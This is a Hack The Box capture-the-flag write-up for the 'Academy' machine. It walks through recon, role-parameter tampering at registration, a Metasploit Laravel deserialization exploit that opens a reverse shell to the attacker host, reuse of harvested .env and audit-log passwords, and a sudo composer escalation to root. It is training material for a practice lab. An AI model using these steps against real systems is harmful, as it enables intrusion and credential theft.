---
layout: post
title: "HTB CTF Write-Up: Academy"
date: 2021-05-04 20:00:00 +0000
author: 0b153c
categories: HTB CTFs
---

---

GL HF!

---

## 0 - Introduction

The following two terms will be used throughout the write-up:

* **Attacker machine**: local burner laptop, loaded with Kali Linux 2020.4, using an IP of 10.10.15.166

* **Target machine**: remote server, Academy (hosted by HTB), using an IP of 10.10.10.215

## 1 - Reconnaissance

### 1.1 – Network scanning

#### 1.1.1

Nmap (short for “Network Mapper”) is used to scan the target IP, identify all open service ports, create a comma separated list of these service ports, and print out the list to confirm scan results.

* On the attacker machine (within a terminal emulator), create a variable called “ports” and define it with the results of the nmap scan:

  ```bash
  ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.215 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
  ```

* Once the scan completes, print the contents of the ports variable:

  ```bash
  echo $ports
  ```

> ![Screenshot_1.1.1](https://i.ibb.co/Ydw0Dgj/1-1-1.png)

Now that the open ports on the target machine have been discovered, additional network scanning may identify more details regarding what is running on the service ports.

#### 1.1.2

A second Nmap scan of the target IP is executed to uncover more information regarding the open ports from section 1.1.1.

* Pass the “ports” variable into a follow-up nmap scan:

  ```bash
  nmap -sC -sV -p$ports 10.10.10.215
  ```

> ![Screenshot_1.1.2](https://i.ibb.co/fdx6WcR/1-1-2.png)

Knowing that the target machine is running OpenSSH Server, Apache Web Server, and--potentially--a MySQL Database Server helps with identifying what to focus on next. At this point, the “easiest” place to start would be the Apache Web Server (80/tcp/http).

### 1.2 – Setting up a local proxy and browsing to the web server

#### 1.2.1

Burp Suite (a suite of tools commonly used for web application security testing) is initialized, as a local web proxy (allowing for web traffic analysis) to be utilized by the web browser browsing the web server on the target machine.

* Identify the Burp Suite Proxy Listener Information
  * Start up Burp Suite, select “temporary project”, and click “Next”
  * Select “Use Burp defaults” and click “Start Burp”
  * Select the “Proxy” tab, click the “Intercept is on” button to turn it off (not needed), and select the “Options” sub-tab
  * Under “Proxy Listeners”, “127.0.0.1:8080” should appear by default (this can be changed but is not necessary)
* On the attacker machine (from a terminal emulator), install the chromium browser (if not already installed) and open it with the proxy settings identified in the previous point:
(Alternatively, the proxy settings of the preferred, or default, web browser may be modified; however, the benefit of the following method is only this instance of the web browser will use the Burp proxy.)

  ```bash
  sudo apt install chromium 
  ```

  ```bash
  /usr/bin/chromium %U --proxy-server="127.0.0.1:8080" 
  ```

By using the Burp Suite proxy listener, all web traffic requests made by the web browser are logged for analysis; in addition, all web traffic requests can be modified and repeated.

#### 1.2.2

Using the newly opened chromium web browser, attempt to browse to the target machine web server, via IP address.

* Browse to <http://10.10.10.215> and receive an “Unknown host: academy.htb” error
* Also, notice the address bar: browsing attempt redirected to “<http://academy.htb>”

Attempting to browse to the target machine’s web server may have failed; however, the host-name of the target machine’s web server is now known. Knowing both the host-name and IP address means DNS can be bypassed.

### 1.3 – Local network routing modification / bypassing DNS

#### 1.3.1

Modify the local machine’s hosts file to include the target machine’s IP address and host-name combination.

* Using “vi” CLI text editor (with elevated permissions), open the attacker machine’s “/etc/hosts” file:

  ```bash
  sudo vi /etc/hosts
  ```

* Enter “Insert Mode” (\<i\>) and append the /etc/hosts file with the IP and host-name combination by adding the following text:

  ```text
  10.10.10.215    academy.htb
  ```

> ![Screenshot_1.3.1](https://i.ibb.co/2SjsxLM/1-3-1.png)

* Enter “Command Mode” (\<Esc\>) to then save the file and quit (by pressing \<Shift\> + \<Z\>, twice)

Since the attacker machine does not have access to the same DNS server as the target machine, manually tying the host-name and IP address of the target machine together allows the attacker machine to bypass the need to query the remote DNS server. Browsing to <http://10.10.10.215> or <http://academy.htb> is now possible.

### 1.4 – Testing and analyzing site registration

#### 1.4.1

Create a new user account on the <http://academy.htb> site and analyze the associated web requests logged in Burp Suite.

* Browse to <http://academy.htb/register.php> by clicking the “Register” link on the top right of the site
* Enter in manually created credentials (for example, aca654:demy321) and click “Register”
* In Burp Suite, under the “Proxy” tab, click the “HTTP History” sub-tab.
* Select the entry matching the following criteria:
  * Host: <http://academy.htb>
  * Method: Post
  * URL: /register.php
  * Status: 302
* Make note of the parameters passed within this HTTP POST Request:  
uid=aca456&password=demy321&confirm=demy321&_**roleid=0**_

> ![Screenshot_1.4.1](https://i.ibb.co/XYyRc55/1-4-1.png)

Analysis of the registration web traffic uncovers a potential broken access control vulnerability (as it looks like new user roles are assigned as a parameter within the registration process).

### 1.5 – Discovering site directories and files

#### 1.5.1

Gobuster (a URI and DNS subdomain brute-forcing tool) is used to discover common sub-directories and web pages on the target web server.

* On the attacker machine (from a terminal emulator), run the following command to brute-force for sub-directories, “txt”, or “php” files (on <http://academy.htb>) with the specified directory word-list:

  ```bash
  gobuster dir -u http://academy.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,php -t 100
  ```

* Once gobuster is finished brute-forcing, review the results:

> ![Screenshot.1.5.1](https://i.ibb.co/pbqPP05/1-5-1.png)

Simply browsing around a website may not reveal all of the sub-directories and web pages on the given site. In this scenario, the discovery of the admin page (admin.php) is most useful.

## 2 – Intrusion

### 2.1 – Manipulating site registration

#### 2.1.1

Using Burp Suite, modify and repeat the registration process with new credentials and an elevated role.

* In Burp Suite, right click on the entry identified in 1.4.1 and click “Send to Repeater”
* Click the “Repeater” tab
* Modify all the parameters in the HTTP POST Request, ensuring to set “roleid” to “1”  
(for example, “uid=aca321&password=demy456&confirm=demy456&roleid=1”)
* Click “Send” (on the top left of the window)
  * The response results in a 302 and loads success-page.php, meaning account creation is successful!

By repeating the web traffic with modified parameters, a new account is created with a higher role than intended by default.

#### 2.1.2

Confirm successful--elevated role--registration by logging in to the admin page with the new credentials.

* Browse to <http://academy.htb/admin.php>
* Enter credentials created in 2.1.1 and click “Login”

By successfully logging into the admin page (with a newly created account), it may be possible to uncover information that should only be accessible to privileged users.

### 2.2 – Post intrusion reconnaissance

#### 2.2.1

Reviewing contents of the admin page, the last item reveals the existence of a development/staging site host-name with pending issues. Appending the attacker machine’s hosts file (similar to 1.3.1) to include the target machine’s IP address and—newly discovered—host-name combination, allows for accessing the development/staging site.

* On the <http://academy.htb/admin-page.php>, focus on the last line:  
_**“Fix issue with dev-staging-01.academy.htb pending”**_
* Using “vi” CLI text editor (with elevated permissions), open the attacker machine’s “/etc/hosts” file:

  ```bash
  sudo vi /etc/hosts
  ```

* Enter “Insert Mode” (\<i\>) and append the /etc/hosts file with the IP and host-name combination by adding the following text:

  ```text
  10.10.10.215    dev-staging-01.academy.htb
  ```

> ![Screenshot_2.2.1](https://i.ibb.co/mhhtDpF/2-2-1.png)

* Enter “Command Mode” (\<Esc\>) to then save the file and quit (by pressing \<Shift\> + \<Z\>, twice)

It is common for a single server to host more than one website by use of virtual directories and sub- domains. Since the attacker machine does not have access to the same DNS server as the target machine, manually tying the host-name and IP address of the target machine together allows the attacker machine to bypass the need to query the remote DNS server. Browsing to <http://dev-staging-01.academy.htb/> is now possible.

#### 2.2.2

The phrase “fix issue with” hints to the fact that there may be additional information available when accessing the development/staging site. Taking note of some key data found on the development/staging site could be beneficial in researching for a potential exploit.

* Browse to <http://dev-staging-01.academy.htb/>
* Review the data in the “Environment & data” section
* Focus on the entries with the “APP_” prefix  
![Screenshot_2.2.2](https://i.ibb.co/d4L9B70/2-2-2.png)
* Search Exploit-DB (<https://www.exploit-db.com/>) for any known vulnerabilities with Laravel (APP_NAME)
* Focus on “PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)” as “[a]uthentication is not required, however exploitation requires knowledge of the Laravel APP_KEY” (<https://www.exploit-db.com/exploits/47129>)

By reviewing the information on the development/staging site, enough information can be gathered to research and find an existing exploit to try.

## 3 – Exploitation

### 3.1 – Executing de-serialization exploit for reverse-shell

#### 3.1.1

Using Metasploit Console (an interface to use the Metasploit Framework), in combination with all the necessary data, successfully running the exploit (researched in 2.2.2) results in gaining remote command execution.

* Start the Metasploit Console:

  ```bash
  msfconsole
  ```

* Load the exploit researched in 2.2.2:

  ```msfconsole
  use exploit/unix/http/laravel_token_unserialize_exec
  ```

* Define the variables required to properly execute the exploitation
  * Remote Host Variable (target machine’s IP):

    ```msfconsole
    set RHOSTS 10.10.10.215
    ```

  * Remote Port Variable (standard http web server port):

    ```msfconsole
    set RPORT 80
    ```

  * Local Host Variable (attacker machine’s IP):

    ```msfconsole
    set LHOST 10.10.15.166
    ```

  * Virtual Host Variable (development/staging site FQDN):

    ```msfconsole
    set VHOST dev-staging-01.academy.htb
    ```

  * APP_KEY Variable (found in 2.2.2):

    ```msfconsole
    set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
    ```

* Now that all the variables have been set, execute the exploit:

  ```msfconsole
  exploit
  ```

* Confirm successful reverse shell by testing a common command to display the current user:

  ```bash
  whoami
  ```

> ![Screenshot_3.1.1](https://i.ibb.co/c8dFFpy/3-1-1.png)

Having remote command execution on the target machine provides opportunities to uncover more sensitive data than analyzing the web sites. Additionally, having access as the service account that runs the website (www-data) means any private data secured behind server-side protections are now viewable (confidentiality), any existing information on the site can be modified (integrity), or the entire site could be moved/deleted/disabled (availability).

### 3.2 – Upgrading the reverse-shell

#### 3.2.1

Upgrade the remote command execution shell for better interaction and to be able to trick the target machine into correctly processing the switch user command via a reverse-shell.

* In the reverse-shell, spawn a pseudo-terminal with Python:

  ```bash
  python3 -c "import pty;pty.spawn('/bin/bash')";
  ```

> ![Screenshot_3.2.1-1](https://i.ibb.co/JCg5Jn1/3-2-1-1.png)

* In a new terminal, on the attacker machine, identify the terminal:

  ```bash
  echo $TERM
  ```

* Back in the reverse-shell, set the TERM and SHELL appropriately

  ```bash
  export SHELL=bash
  export TERM=<result of echo $TERM on attacker machine>
  ```

> ![Screenshot3.2.1-2](https://i.ibb.co/R2wdGyW/3-2-1-2.png)

By default, the reverse-shell provided by proper execution of the exploit is just a “dummy” shell; however, using a few commands, the reverse-shell can be upgraded for ease of use and added functionality. (The most notable functionality now available is the switch user, or “su”, command--to be used later on.)

### 3.3 – Post exploitation reconnaissance

#### 3.3.1

List the contents of the “/home” directory on the target system.

* `ls -la /home`

> ![Screenshot_3.3.1](https://i.ibb.co/tBV0N2G/3-3-1.png)

By listing the sub-directories under “/home”, a list of existing system users is revealed. If passwords are found, the switch user (su) command can be used to attempt to login as one of these users.

#### 3.3.2

After some basic reconnaissance, discover a hidden environment file in the “/var/www/html/academy/” directory: printing and reviewing the contents.

* `cd /var/www/html/academy`

* `ls -la /var/www/html/academy/`

> ![Screenshot_3.3.2-1](https://i.ibb.co/3BTC0V3/3-3-2-1.png)

* `cat .env`

> ![Screenshot_3.3.2-2](https://i.ibb.co/n1tQsTt/3-3-2-2.png)

* Make note of the value for “DB_PASSWORD=”  
_**mySup3rP4s5w0rd!!**_

Hidden environment files (.env) are known to contain sensitive data. While some of the sensitive data within this file is already known (the APP_KEY for Laravel uncovered in 2.2.2), there is a password (DB_PASSWORD) in this file that is in plain text. Since password re-use is a common security policy flaw, it is always worth trying newly discovered passwords against all known user accounts.

## 4 – Lateral Movement (1 of 2)

### 4.1 – Breaking authentication

#### 4.1.1

In attempting to use the newly discovered password (in 3.3.2) against the list of known usernames, the credentials work for logging in as one of the accounts!

* Use the switch user command to login as the user “cry0l1t3” and adopt the user’s environment:

  ```bash
  su - cry0l1t3
  ```

* Enter the password discovered in 3.3.2:

  ```bash
  Password: mySup3rP4s5w0rd!!
  ```

* Confirm login success:

  ```bash
  whoami
  ```

> ![Screenshot_4.1.1](https://i.ibb.co/ss2JHGH/4-1-1.png)

While having access as the web service account (www-data) had a few security implications, they were limited—only—to the the files and folders that the web service account had access to (usually limited). By switching to a different user account, more files and folders are available for further reconnaissance.

### 4.2 – Post lateral movement reconnaissance

#### 4.2.1

Print out the contents of the user.txt file to prove user “own”.

* `cat user.txt`

> ![Screenshot_4.2.1](https://i.ibb.co/Qbh34RP/4-2-1.png)

_CTF objective one of two accomplished!_

#### 4.2.2

After some thorough reconnaissance, discover an audit log file containing an encoded password.

* Change directory to the location of the audit log files:

  ```bash
  cd /var/log/audit
  ```

* List any log entries where the “su” command was used:

  ```bash
  grep 'comm="su"' audit.log audit.log.1 audit.log.2 audit.log.3
  ```

* Make note of the value for “data=”  
_**6D7262336E5F41634064336D79210A**_

> ![Screenshot_4.2.2](https://i.ibb.co/pR3Yy2Z/4-2-2.png)

Audit logs--when readable--can be a goldmine of useful information. In this scenario, one of the audit log files had encoded data from a previous use of the switch user command. Properly decoding this data would mean having another password to try against the remaining user accounts.

#### 4.2.3

Decode the data discovered in the audit logs (in 4.2.2), using hURL (a lightweight command line interface tool used to encode/decode many formats). Upon further analysis of the data string, it appears to be hex encoding.

* In a new terminal window on the attacker machine, decode the hex encoded string with the proper arguments in hURL:

  ```bash
  hURL -x 6D7262336E5F41634064336D79210A
  ```

* Make note of the results (it looks like the username is in the password):  
_**mrb3n_Ac@d3my!**_

> ![Screenshot_4.2.3](https://i.ibb.co/9yMSXXx/4-2-3.png)

By decoding the data discovered in 4.2.2, yet another password is uncovered. In this case, the password may even include the username as the prefix of the password matches an existing user.

## 5 – Lateral Movement (2 of 2)

### 5.1 – Breaking authentication

#### 5.1.1

In attempting to use the newly discovered password (in 4.2.3) against the assumed username, the credentials work for logging in!

* Use the switch user command to login as the user “cry0l1t3” and adopt the user’s environment:

  ```bash
  su - mrb3n
  ```

* Enter the password decoded in 4.2.3:

  ```bash
  Password: mrb3n_Ac@d3my!
  ```

* Confirm login success:

  ```bash
  whoami
  ```

> ![Screenshot_5.1.1](https://i.ibb.co/Z6YGVbj/5-1-1.png)

Each successful user login is another opportunity to uncover more sensitive data, security misconfigurations, or vulnerabilities on the system—eventually, leading to privilege escalation!

### 5.2 - Post lateral movement reconnaissance

#### 5.2.1

Enumerate what the current user has permissions to run, in an elevated mode.

* List the commands that the user “mrb3n” is able to run with “sudo”:

  ```bash
  sudo -l
  ```

* `[sudo] password for mrb3n: mrb3n_Ac@d3my!`

* Make note of the one command:  
_**/usr/bin/composer**_

> ![Screenshot_5.2.1](https://i.ibb.co/ZK8MS75/5-2-1.png)

After identifying if, and what, the current user has permissions to run in an elevated fashion, additional research may uncover potential privilege escalation methods.

#### 5.2.2

Searching “composer” on <https://gtfobins.github.io> (a site dedicated to sharing how legitimate functions of certain tools can be abused for privilege escalation) results in finding detailed instructions on how to bypass the system security restrictions.

* Review contents, under the “Sudo” heading, on the following page:  
<https://gtfobins.github.io/gtfobins/composer/>

Since the current user can run the “composer” tool in an elevated fashion, the steps outlined on the referenced gtfobins page may be used to gain elevated access to the system.

## 6 – Privilege Escalation

### 6.1 – Exploiting privilege escalation vulnerability

#### 6.1.1

Run the commands, uncovered in 5.2.2, to gain elevated access to the system and confirm successful privilege escalation.

* `TF=$(mktemp -d)`

* `echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json`

* `sudo composer --working-dir=$TF run-script x`

* `[sudo] password for mrb3n: mrb3n_Ac@d3my!`

* Confirm success:

  ```bash
  whoami
  ```

> ![Screenshot_6.1.1](https://i.ibb.co/Tvw9cgx/6-1-1.png)

Confirming theory from 5.2.2: the documented privilege escalation does--in fact--work. At this point, the entire server is completely compromised as commands can now be run with the highest level of access.

### 6.2 – Post privilege escalation exploit reconnaissance

#### 6.2.1

Print out the contents of the root.txt file to prove system “own”.

* `cat /root/root.txt`

> ![Screenshot_6.2.1](https://i.ibb.co/h82RXmc/6-2-1.png)

_**CTF objective two of two accomplished!**_

## 7 - CWE References and Recommendations

(Coming Soon...)

---

GG!

---
